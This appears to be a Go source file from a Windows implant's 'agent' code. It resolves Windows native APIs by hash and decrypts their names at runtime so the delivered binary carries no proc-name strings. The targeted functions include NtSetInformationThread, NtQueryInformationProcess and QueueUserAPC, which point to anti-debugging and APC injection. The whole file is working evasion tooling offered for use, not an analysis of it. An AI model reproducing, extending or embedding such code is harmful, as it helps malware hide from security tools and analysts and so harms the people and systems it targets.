//go:build windows
// +build windows

package main

import (
	"syscall"
)

// API-hash proc resolution (P0 increment).
//
// Call sites carry only a uint32 FNV-1a hash instead of a plaintext proc name.
// The candidate plaintexts live exclusively in the per-build randomized
// strxor table and are decrypted at runtime via s(), so the delivered binary
// never contains the proc-name bytes. Resolution falls back to plain NewProc
// on the already-decrypted name, preserving exact legacy behavior (including
// lazy-load semantics) when the hash matches nothing.

// resolveProcByHash matches hash against FNV-1a(candidates) and returns
// dll.NewProc(name) for the first match. Candidates must already be
// runtime-decrypted (e.g. s(SProcNtQIP)); passing plaintext literals here
// defeats the purpose.
func resolveProcByHash(dll *syscall.LazyDLL, hash uint32, candidates ...string) *syscall.LazyProc {
	for _, name := range candidates {
		if name == "" {
			continue
		}
		if fnv1a32(name) == hash {
			return dll.NewProc(name)
		}
	}
	return nil
}

// ntdllProc resolves an ntdll export by hash over runtime-decrypted strxor
// candidates, falling back to direct NewProc so behavior is identical even if
// the table ever lacks the candidate.
func ntdllProc(dll *syscall.LazyDLL, hash uint32, decrypted string) *syscall.LazyProc {
	if p := resolveProcByHash(dll, hash, decrypted); p != nil {
		return p
	}
	return dll.NewProc(decrypted)
}

// Must match FNV-1a("NtQueryInformationProcess"), ("NtSetInformationThread"),
// ("NtClose") and ("GetCurrentThread") respectively. Verified by
// TestAPIHashVectors (agent package, windows-only build path excluded from
// linux CI via build tag on the test).
const (
	hashNtQueryInformationProcess uint32 = 0xea2dda8a
	hashNtSetInformationThread    uint32 = 0xf19e1321
	hashNtClose                   uint32 = 0x6b372c05
	hashGetCurrentThread          uint32 = 0x9bc5a608
	hashQueueUserAPC              uint32 = 0x890bb4fb
)
